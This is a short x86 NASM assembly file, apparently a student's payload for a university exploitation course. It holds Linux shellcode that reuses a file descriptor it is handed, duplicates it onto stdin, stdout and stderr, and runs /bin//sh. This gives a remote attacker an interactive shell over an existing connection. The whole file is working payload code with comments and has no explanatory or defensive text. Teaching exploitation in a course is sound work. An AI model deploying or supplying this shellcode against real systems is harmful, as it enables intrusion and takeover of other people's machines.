; nasm -f bin shellcode.asm

;--------------------------------------------
; Name: 
; Class: CS4678
; Assignment 5
; File: lsod_shellcode.asm modified for assignment 8
; Last modified: 6 Mar 2012
;---------------------------------------------
;

;LSoD spawn a shell

;syscall     %eax %ebx,%ecx,%edx
;----------- ---- ---------------------------------------------------------------
;exec        x00b ->path="/bin//sh",->[->a0=path,0]

SYS_EXECVE equ 0x0B
SYS_DUP2 equ 0x3f


USE32

   mov     ebx,[ebp+0x8]         ;fd into ebx
   xor     ecx,ecx
   mov     cl,3
dup_loop:                  ;dup2 stderr, stdout, stdin
   xor     eax,eax
   mov     al,SYS_DUP2
   dec     ecx
   int     0x80
   inc     ecx
   loop    dup_loop
   xor    eax,eax    ;zero eax
   push   eax        ;null terminate "/bin//sh"
   push   0x68732f2f ;//sh
   push   0x6e69622f ;/bin
   mov    ebx, esp   ;argv[0]
   push   eax        ;null terminate argv list
   push   ebx        ;argv[0]
   mov    ecx, esp   ;argv
   cdq               ;zero edx
   mov    al, SYS_EXECVE
   int    0x80

